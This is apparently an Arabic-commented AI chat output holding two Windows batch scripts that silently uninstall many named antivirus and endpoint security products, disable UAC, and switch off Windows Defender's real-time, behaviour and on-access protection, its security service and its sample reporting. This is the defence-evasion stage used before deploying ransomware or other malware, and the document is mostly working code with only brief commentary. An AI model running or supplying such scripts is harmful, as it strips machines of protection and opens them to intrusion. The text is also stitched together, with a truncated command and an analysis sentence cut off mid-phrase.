
@echo off
rem أوامر إلغاء تثبيت برامج الحماية والأمان صامتاً
start wmic product where name="Webroot SecureAnywhere" call uninstall /nointeractive
start wmic product where name="Symantec Endpoint Protection" call uninstall /nointeractive
start wmic product where name="AVG 2015" call uninstall /nointeractive
start wmic product where name="McAfee VirusScan Enterprise" call uninstall /nointeractive
start wmic product where name="McAfee Agent" call uninstall /nointeractive
start wmic product where name="McAfee DLP Endpoint" call uninstall /nointeractive
start wmic product where name="McAfee Endpoint Security Platform" call uninstall /nointeractive
start wmic product where name="McAfee Endpoint Security Threat Prevention" call uninstall /nointeractive
start wmic product where name="Microsoft Security Client" call uninstall /nointeractive
start wmic product where name="Malwarebytes' Managed Client" call uninstall /nointeractive
start wmic product where name="Sophos System Protection" call uninstall /nointeractive
start wmic product where name="Sophos AutoUpdate" call uninstall /nointeractive
start wmic product where name="Sophos Remote Management System" call uninstall /nointeractive
start wmic product where name="McAfee SiteAdvisor Enterprise" call uninstall /nointeractive
start wmic product where name="Symantec Backup Exec Remote Agent for Windows" call uninstall /nointeractive
start wmic product where name="ESET File Security" call uninstall /nointeractive

rem أمر تعديل سجل النظام لتعطيل UAC (يتطلب إعادة تشغيل الجهاز لتطبيقه)
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

rem أوامر PowerShell لتعطيل الحماية الفورية وإزالة ميزات النظام (الأمر الأخير غير مكتمل)
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe Uninstall-WindowsFeature -Name
يُرجى استخدام الرمز البرمجي بحذر.
هل تحتاج إلى شرح تفصيلي إضافي لكيفية عمل سطر معين من هذه الأسطر، أم تود معرفة الطرق الأمنية والدفاعية (مثل ميزة Tamper Protection) التي تستخدمها الأنظمة الحديثة لإحباط مثل هذه السكربتات؟




بناءً على فحص النص والبيانات البرمجية الجديدة التي أرفقتها، إليك التحليل الفني والكامل لهذا السكربت، والذي يمثل النسخة الأكثر عدوانية وتفصيلاً لتعطيل نظام أمان 
@echo off
rem تفعيل الصلاحيات وتعطيل الحماية الفورية عبر PowerShell
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe Uninstall-WindowsFeature -Name Windows-Defender

rem تعطيل مركز أمان ويندوز ومنع ظهور أيقونة الحماية في شريط المهام
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

rem تهيئة وحذف السياسات القديمة ثم إعادة حقن قيم التعطيل الكامل لـ Windows Defender
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f

rem تعطيل آليات الفحص الفوري ومراقبة السلوك وفحص الملفات المحملة
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f

rem إيقاف الإشعارات المتقدمة ونظام إرسال العينات والتقارير إلى مايكروسوفت
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
